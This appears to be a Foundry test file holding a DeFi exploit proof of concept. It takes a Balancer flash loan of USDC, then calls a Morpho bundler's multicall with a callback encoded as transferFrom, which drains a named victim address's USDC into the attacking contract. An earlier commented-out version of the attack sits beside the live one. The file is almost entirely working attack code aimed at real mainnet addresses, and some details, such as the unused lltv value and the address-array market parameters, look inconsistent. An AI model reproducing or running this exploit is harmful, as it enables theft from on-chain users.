// SPDX-License-Identifier: UNLICENSED
// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!
pragma solidity >=0.7.0 <0.9.0;

import "forge-std/Test.sol";
import "./test/interfaces/IBalancerVault.sol";
import "./test/interfaces/IERC20.sol";

interface IEthereumBundlerV2 {
    function multicall(bytes[] calldata data) external payable;
    function morphoSupplyCollateral(
        uint256 payableAmount, 
        address[] calldata marketParams, 
        uint256 assets, 
        address onBehalf, 
        bytes calldata data
    ) external payable;
}

contract ContractTest is Test {
  IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
  address vic = 0x33421FA588A5c51AAf7Dc772103045D80B92976D;
  IEthereumBundlerV2 EtherBundlerV2 = IEthereumBundlerV2(0x4095F064B8d3c3548A3bebfd0Bbfd04750E30077);

  IBalancerVault vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);


  function setUp() public {
    vm.createSelectFork("mainnet", 14684822);
  }

  function testBalancer_flashloan() public {
    address[] memory tokens = new address[](1);

    tokens[0] = address(usdc);

    uint256[] memory amounts = new uint256[](1);

    amounts[0] = 150000000 * 10**6;

    vault.flashLoan(address(this), tokens, amounts, "");
  }

  function receiveFlashLoan(
    IERC20[] memory tokens,
    uint256[] memory amounts,
    uint256[] memory feeAmounts,
    bytes memory userData
  ) external {
    tokens;
    amounts;
    feeAmounts;
    userData;

    uint256 usdc_balance = usdc.balanceOf(address(this));
    emit log_named_uint("Borrow USDC from balancer", usdc_balance);
    attack();
    usdc.transfer(address(vault), usdc_balance);

    usdc_balance = usdc.balanceOf(address(this));

    emit log_named_uint("USDC balance after repayying", usdc_balance);
  }

//   function attack() internal {
//     usdc.approve(address(EtherBundlerV2), usdc.balanceOf(address(this)));
//     bytes[] memory data = new bytes[](1);
//     // Define parameters for morphoSupplyCollateral
//         uint256 payableAmount = 0;
//         address loanToken = address(usdc);
//         address collateralToken = address(usdc);
//         address oracle = address(this); // Replace with actual oracle address
//         address irm = address(this); // Replace with actual interest rate model address
//         uint256 lltv = 0; // Replace with actual lltv value

//         // Create marketParams as an array of addresses
//         address[] memory marketParams = new address[](4);
//         marketParams[0] = loanToken;
//         marketParams[1] = collateralToken;
//         marketParams[2] = oracle;
//         marketParams[3] = irm;

//         uint256 assets = usdc.balanceOf(address(this));
//         address onBehalf = address(this);
//         bytes memory callbackData = "";
        
//         data[0] = abi.encodeWithSelector(
//             EtherBundlerV2.morphoSupplyCollateral.selector,
//             payableAmount,
//             marketParams,
//             assets,
//             onBehalf,
//             callbackData
//         ); // Adjust as necessary

//         EtherBundlerV2.multicall{value: 0}(data);

//   }

  function attack() internal {
    usdc.approve(address(EtherBundlerV2), usdc.balanceOf(address(this)));
    uint256 balanceBefore = usdc.balanceOf(address(this));
    emit log_named_uint("USDC balance before approve", balanceBefore);

    usdc.approve(address(EtherBundlerV2), balanceBefore);

    bytes[] memory data = new bytes[](1);
    // Define parameters for morphoSupplyCollateral
    uint256 payableAmount = 0;
    address loanToken = address(usdc);
    address collateralToken = address(usdc);
    address oracle = address(this); // Replace with actual oracle address
    address irm = address(this); // Replace with actual interest rate model address
    uint256 lltv = 0; // Replace with actual lltv value

    // Create marketParams as an array of addresses
    address[] memory marketParams = new address[](4);
    marketParams[0] = loanToken;
    marketParams[1] = collateralToken;
    marketParams[2] = oracle;
    marketParams[3] = irm;

    uint256 assets = balanceBefore;
    address onBehalf = address(this);
    bytes memory callbackData = abi.encodeWithSelector(
        bytes4(0x23b872dd), // transferFrom selector
            address(vic),
            address(this),
            usdc.balanceOf(vic)
    );

    data[0] = abi.encodeWithSelector(
        EtherBundlerV2.morphoSupplyCollateral.selector,
        payableAmount,
        marketParams,
        assets,
        onBehalf,
        callbackData
    );

    try EtherBundlerV2.multicall{value: 0}(data) {
        emit log("Multicall succeeded");
    } catch Error(string memory reason) {
        emit log_string(reason);
    } catch (bytes memory lowLevelData) {
        emit log_bytes(lowLevelData);
    }

    uint256 balanceAfter = usdc.balanceOf(address(this));
    emit log_named_uint("USDC balance after attack", balanceAfter);
}

}